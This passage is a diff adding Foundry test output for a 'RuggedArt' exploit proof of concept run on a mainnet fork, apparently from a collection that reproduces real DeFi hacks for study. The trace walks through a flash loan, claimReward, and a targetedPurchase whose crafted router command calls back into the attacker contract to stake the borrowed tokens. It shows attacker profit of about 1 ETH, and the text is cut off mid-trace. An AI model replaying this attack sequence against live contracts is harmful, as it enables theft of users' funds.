@@ -1,0 +1,1332 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/RuggedArt_exp.sol:ContractTest
+[PASS] testExploit() (gas: 7102116)
+Logs:
+  Attacker Eth balance before attack:: 0
+  Attacker Eth balance after attack:: 1023851896415447765
+
+Traces:
+  [19491] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 19262233 [1.926e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], "proxy")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(RUGGED: [0xbE33F57f41a20b2f00DEc91DcC1169597f36221F], "RUGGED")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], "pool")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(RuggedMarket: [0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6], "RuggedMarket")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Universal_Router: [0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD], "Universal_Router")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [8882910] ContractTest::testExploit()
+    ├─ [2534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] 0x0000000000000000000000000000000000000000::fallback()
+    │   └─ ← [Stop]
+    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
+    │   └─ ← [Return]
+    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_uint(key: "Attacker Eth balance before attack:", val: 0)
+    ├─ [8216165] pool::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19], 0, 0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   ├─ [2630] RUGGED::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
+    │   │   └─ ← [Return] 356565570739218611936 [3.565e20]
+    │   ├─ [2534] WETH::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
+    │   │   └─ ← [Return] 21357138155001948655 [2.135e19]
+    │   ├─ [2315335] RUGGED::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19])
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9159)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9004)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3270)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8866)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 347)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9050)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3033)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 41)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7485)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9192)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 1933)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9017)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7093)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4090)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3525)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3978)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4984)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7449)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3913)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 6049)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8796)
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4903)
+    │   │   ├─ emit ERC20Transfer(from: pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 22000000000000000000 [2.2e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea0: 5491 → 0
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4360: 9159 → 3638
+    │   │   │   @ 0xfcfabd4a56e9bfecfa37ff01e38388e0a80a8618e1913ce41ed7253b1cf13dff: 0 → 1
+    │   │   │   @ 0x61042a91e6bf866457bba3c0e1666b25163b3849470db2bebc37920294f5c189: 0 → 1
+    │   │   │   @ 0x7eca25646d77fbe48d97efe900eaf35453ca5066c6465950256408bb31a48a1b: 0 → 15
+    │   │   │   @ 0x201eefa0b4934df22afa051a4a9c50a1a60812f397c2287f31526961a63e7648: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e95: 684 → 0
+    │   │   │   @ 0x5b053a6f0242520d4e5daa90fe6eddb38b2e7d2afe6575e476efb712b763e344: 0 → 21
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4c6c: 9050 → 6749
+    │   │   │   @ 0xa32660c37288b6240702978abc3911b347bc8636e5e4c7ae751b67184edd47c1: 0 → 1
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d98: 0 → 7093
+    │   │   │   @ 0x6971aedab59087793b7b619727961bf26ce046f5037bd4ce832c788cc9b6ea48: 0 → 1
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d93: 0 → 41
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4683: 3913 → 2078
+    │   │   │   @ 0x509055df01107bc64af72dc08330b9397ce32ea3183e634e399c3833b7aa595e: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9a: 0 → 3525
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4726: 4090 → 4166
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb404c: 7449 → 684
+    │   │   │   @ 0x16d4236f8135b486684a8fac3481a9cf3bb5748669ffb02a03afa726d60d00f8: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0xa421f34ee23dbb9537ec1b4f1a9a588ba34e2a5164c64d7eabc1c8445ab8741b: 0 → 5
+    │   │   │   @ 0x5278f81f69b597f632ca94967c8a1a3079fb3012864a72e457e419fddec9a26b: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0x0fafaf592b21ef4721412e49ab07d865c4e3fb0498759b84225e469cab110d51: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0xdc546f96e41e999be4708cb6101a04d8f998356cd939cdf7cc4d0a8fa5af457b: 0 → 1
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4cbd: 3033 → 5491
+    │   │   │   @ 0x4d4d0ea6828e6cfadf573d00ca0ceecd1b88d8fe03738c680525933a0c6566d2: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0x9c21bc71da0e484dfd35ad2a10d338fedd95a67f06d8e39198816abf0c9b1168: 0 → 9
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4384: 6049 → 295
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9a: 7455 → 0
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea6: 3638 → 0
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d95: 0 → 9192
+    │   │   │   @ 0x57bced4c9b502a71acfd2d950a1d54dae5d72be78e16aaaece921b2c058d70ac: 0 → 14
+    │   │   │   @ 0x1214a60f33c6391325f4fe835803e25bbbc9ab9ba21d99ebf959d2fd32d9d52e: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9d: 5744 → 0
+    │   │   │   @ 0x36822dd15940f1efccfbc62c0ff56967efaf9783a99f51ad14a05140cb0a430b: 0 → 1
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e99: 4166 → 0
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8d: 0 → 9004
+    │   │   │   @ 0xcc2c5c17b159d60d905b954901e7a94ae9978f5d8ea9527f13bcd28ff7a38b73: 0 → 17
+    │   │   │   @ 0x90f74e7e321e9118b5cac70778fe7663e6d5eb2e2e1379bbdc55c70fa9089b00: 0 → 1
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d92: 0 → 3033
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4676: 3978 → 7882
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb3f07: 41 → 5185
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9b: 0 → 3978
+    │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 0 → 22
+    │   │   │   @ 0x6a71dca57933fa17eee14913cde5265fb9e89923a9146e65eb6c63cec9c9a91e: 0 → 1
+    │   │   │   @ 0x6ac42465a8b4c0f32b318bd6a8f0b22cdc01505097dac159adad5ddc02c3cd21: 0 → 1
+    │   │   │   @ 0xfbf57951a20a7af7daeefa1d2d90f0cd061fcf465fe6b720b4ff482e80709475: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8f: 0 → 8866
+    │   │   │   @ 0x0c07f4fe9e7a67d59a6d916831877a58b85ff9aa619bc0726a102b66b7e76c9b: 0 → 7
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8c: 0 → 9159
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9e: 6570 → 0
+    │   │   │   @ 0xf403129ad72c5f3e78204716d3c5c26cbba1cfa7d9cceb2222765bacfb489763: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb40f7: 4984 → 4677
+    │   │   │   @ 0xbbdbe4e1aed388a8a210d48bb604ec066f940a7085cd8c3d200a60e0dccf0114: 0 → 1
+    │   │   │   @ 0x47a92aee51ae5fb9a8dbf64361d3f29bfe75ae230c138247702116a4244ffaa1: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb3f85: 3270 → 8174
+    │   │   │   @ 0x92c46ef96d6b5851f28c3b312ac87768a2ba6b97f3e3a5f8cb08c46b35a648b3: 0x0000000000000000000000000000000000000000000000135457616c058afee0 → 0x0000000000000000000000000000000000000000000000122307adfba2f2fee0
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e98: 2052 → 0
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e93: 295 → 0
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb43ed: 8796 → 6452
+    │   │   │   @ 0xdf386c9f5c4a91c50236b85e63d17a35fdb7e8f95a69d64676cdd3a1b078b98e: 0 → 1
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d94: 0 → 7485
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e94: 2078 → 0
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d91: 0 → 9050
+    │   │   │   @ 0x593b9d14d50e92a65df8d78640350d8ddcd444024c2cc502610aac7c5d87a431: 0 → 12
+    │   │   │   @ 0xd51f4af17988aa3c9a4279e56b5c513456be996db0aa93724276e1e964f840cd: 0 → 1
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea3: 643 → 0
+    │   │   │   @ 0xd9379a4d2df17ecad725133e46dbfa3a48f8df77dd941acd4d8666c461a1777d: 0 → 1
+    │   │   │   @ 0x43b2386d4d3972d2f65d70f347e567d6b0c366ab6fb9eb781c2f1d30d6b1d7e5: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9e: 0 → 3913
+    │   │   │   @ 0xff842230989f970b5f317b3598e2868dfc6e1bc70472a2e69470aa6da7b9a1f9: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e97: 7882 → 0
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9d: 0 → 7449
+    │   │   │   @ 0xa27a003d522ac157c4e7ffbab56d613e37f5925b9ff9d6fd072e3d4f93ef1f0f: 0 → 16
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e96: 4677 → 0
+    │   │   │   @ 0xd688421fed0da63bb41748eaebc09adf1b400e13d1eadd1583aaef2e7b2c03cf: 0 → 6
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d99: 0 → 4090
+    │   │   │   @ 0xf853896e04fb6beb93d833844d863061a0341bffbc06e50ef88896dcb9648a2a: 0 → 3
+    │   │   │   @ 0x1b137e43b0e30898156d4dbd1f04e48bffecac6b87d788f4d716dc4cedc28e45: 0 → 10
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb43a2: 7093 → 7455
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4c5e: 1933 → 6719
+    │   │   │   @ 0x8df1577a16d9d36c77559c4b5bc9124bab6715f951b3cec262a08223cd59655a: 0 → 1
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4dca: 9017 → 5669
+    │   │   │   @ 0x754c3d23b53fe0c86c15828a5ac606752c899fa8175b595783936f2a9b59c3df: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d97: 0 → 9017
+    │   │   │   @ 0xd3de864699c49dd73fbc1f9e1cb65cc5761d6378b5d5927db2f6a6be3fe931ef: 0 → 20
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d96: 0 → 1933
+    │   │   │   @ 0xd7afa6abb1ac288cb75dcd88b595b3d70e5c62f92b144685cd73adda83d552ea: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4a55: 3525 → 2052
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e91: 5943 → 0
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d90: 0 → 347
+    │   │   │   @ 0xa9c8473723def7a8ce3ea8bfb784a667951a62cb70ea5379a81bc26ea5519df6: 0 → 2
+    │   │   │   @ 5: 4343 → 4321
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea2: 8781 → 0
+    │   │   │   @ 0x1caba39457f65f114b07ad8c5d85e0e58a22d995739ecfffc1aa24e764929db2: 0 → 8
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9f: 0 → 6049
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d8e: 0 → 3270
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4550: 347 → 8781
+    │   │   │   @ 0xed328d2bb428e8669bc7cffac36f7bfa7be91b9f3cf6909ec4029ad835946798: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da1: 0 → 4903
+    │   │   │   @ 0xa40251d2b6688359486135c6e76e1abd31779178b88ebf380a9f419756243854: 0 → 1
+    │   │   │   @ 0x2bf44c59b7dfa0b983853ab9a9df75d73a6c3f25f352c17ef5841d15c33e5a8d: 0 → 13
+    │   │   │   @ 0x96cf7746f18a97cf11d1e4d88837e1786085500ea82c421d7cdbd15759a9d51e: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea5: 715 → 0
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9f: 5185 → 0
+    │   │   │   @ 0x9a86beb6228bf168307f184cf63c593599ffdab1a9a2399ca6e1c21e6fff27ee: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0xe7ce429ac7a3c0c4496332bad5eb5dffe331e40b2a4c50def06dcc0d6027a874: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4209: 4903 → 5943
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb3e65: 9004 → 715
+    │   │   │   @ 0x278f4573a69e3831cd8adb28e1f945e081534e9d1c9b485ab956be05d3187cd6: 0 → 1
+    │   │   │   @ 0x4d4695fd027810f7d8a51d8c6d12aaac78b91258cb3f49850c4ffea388e3b005: 0 → 19
+    │   │   │   @ 0x6fe927c728cb1a50914fc42111657f0cb05320d84f4bf69c230741967e26adee: 0 → 1
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4a56: 9192 → 5744
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9c: 0 → 4984
+    │   │   │   @ 0x5d4e160575fee9c3345b17a5540abdd97c833048d80099370b0a86e8fdb4ca4b: 0 → 1
+    │   │   │   @ 0x36bb8b7d694abd1ddcfd6ad0e40c7f1bb98463dfcb3f63c4d8ea061ef08403b2: 0 → 11
+    │   │   │   @ 0x4a86c16f9f4d8ddc461d66e4f2f711659d32a2de536944ecd4866011e4888dfb: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0xf628b9f41573c0b9c087365a59c95440d0d7bba73f05e58e6c4ebc7a1d5cd252: 0 → 1
+    │   │   │   @ 0xff84529e16e49c94f43586df550f0114053b5c9adb3205d522559199b3b6401b: 0 → 1
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea1: 6749 → 0
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb408d: 8866 → 643
+    │   │   │   @ 0xdbdc55d7621c6061576ada6656295ae01b65e3eb3f1854f3486f5ce65e3c82d2: 0 → 18
+    │   │   │   @ 0x28cc13b836cf79b3fcf55dfa84c4ced0b94e65e4229aa224d49c90a40eac8b2c: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4ea4: 8174 → 0
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e92: 6452 → 0
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9b: 5669 → 0
+    │   │   │   @ 0x0e7db45edec961ebbfe5c90b251b8e1b57ac28de641a068a5f6ce9333a19a77f: 0 → 1
+    │   │   │   @ 0x4ab23ed1f83872b0a45de39f6ed7d229ae280f63ff22205982744af85aa148b3: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 0xf2fd03ad4e254bdad2fe17ba09af9c75d08a7fa2e857461c6471ddf929e5138a: 0 → 1
+    │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2da0: 0 → 8796
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb49b3: 7485 → 6570
+    │   │   │   @ 0xc75099ea203e179b5fed28a847cb830059ddef10f334d856ccf9250c338c1258: 0 → 4
+    │   │   │   @ 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb4e9c: 6719 → 0
+    │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0 → 0x000000000000000000000000000000000000000000000001314fb37062980000
+    │   │   │   @ 0xa48a0046b556202b266997a920608b4f973032aebfea8fee20d7369d2c10eeb7: 0 → 1
+    │   │   │   @ 0x2d015ef0357f85f216b2e8c1b54273d960fdb9b3d9f4e846e824345a939f94aa: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   └─ ← [Return] true
+    │   ├─ [5869810] ContractTest::uniswapV3FlashCallback(66000000000000000 [6.6e16], 0, 0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   │   ├─ [45483] proxy::claimReward()
+    │   │   │   ├─ [40593] RuggedMarket::claimReward() [delegatecall]
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 4: 0x0000000000000000000000000000000000000000000000000000000b57b47dd2 → 0x0000000000000000000000000000000000000000000000000000000b596319c5
+    │   │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ad1: 0x00000000000000000000000000000000000000000000000047814665d40d783d → 0x00000000000000000000000000000000000000000000000047b4978b20243f59
+    │   │   │   │   │   @ 6: 0x0000000000000000000000000000000000000000000000000000000065d35c7b → 0x0000000000000000000000000000000000000000000000000000000065d35eeb
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ [3446361] proxy::targetedPurchase{value: 1}([9721, 5163, 2347, 3145, 2740, 1878, 6901, 3061, 1922, 5301, 454, 2178, 8298, 4825, 9307, 2628, 6115, 8565, 7991, 4945], UniversalRouterExecute({ commands: 0x04, inputs: [0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001], deadline: 1708351211 [1.708e9] }))
+    │   │   │   ├─ [3445774] RuggedMarket::targetedPurchase{value: 1}([9721, 5163, 2347, 3145, 2740, 1878, 6901, 3061, 1922, 5301, 454, 2178, 8298, 4825, 9307, 2628, 6115, 8565, 7991, 4945], UniversalRouterExecute({ commands: 0x04, inputs: [0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001], deadline: 1708351211 [1.708e9] })) [delegatecall]
+    │   │   │   │   ├─ [2630] RUGGED::balanceOf(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 511846574232226400833 [5.118e20]
+    │   │   │   │   ├─ [2422527] Universal_Router::execute{value: 1}(0x04, [0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001], 1708351211 [1.708e9])
+    │   │   │   │   │   ├─ [2408770] ContractTest::fallback{value: 1}()
+    │   │   │   │   │   │   ├─ [24681] RUGGED::approve(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x8f6d89859724fe34852060bef98eb0f60226cb89e3c5ecd5a5a51b9cb0df329d: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [630] RUGGED::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 22000000000000000000 [2.2e19]
+    │   │   │   │   │   │   ├─ [2378807] proxy::stake(22000000000000000000 [2.2e19])
+    │   │   │   │   │   │   │   ├─ [2378417] RuggedMarket::stake(22000000000000000000 [2.2e19]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ [2325542] RUGGED::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], 22000000000000000000 [2.2e19])
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0000000000000000000000000000000000000000, tokenId: 4903)
